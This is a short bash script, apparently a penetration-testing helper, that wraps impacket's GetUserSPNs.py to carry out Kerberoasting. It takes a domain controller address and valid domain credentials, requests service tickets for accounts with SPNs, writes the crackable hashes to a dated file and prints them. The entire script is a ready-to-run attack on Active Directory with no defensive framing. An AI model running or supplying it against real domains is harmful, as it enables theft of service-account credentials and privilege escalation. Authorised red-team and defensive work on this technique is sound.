#!/bin/bash
# ARGS
# DC_IP "Domain Controller IP Address"
# Domain "FQDN of domain: prod.example.local"
# Username "Valid User on domain"
# Password "Password for that user"
# ENDARGS
# AUTHOR: Mitchell Kerns

ip="$1"
echo "$ip"
domain="$2"
echo "$domain"
user="$3"
echo "$user"
pass="$4"

# Construct the command using an array
cmd=("sudo" "python3" "/usr/share/doc/python3-impacket/examples/GetUserSPNs.py" "-dc-ip" "$ip" "$domain/$user:$pass" "-request" "-outputfile" "kerberoasted_$(date +%F).txt")

# Execute the command using array expansion
"${cmd[@]}"
cat kerberoasted_*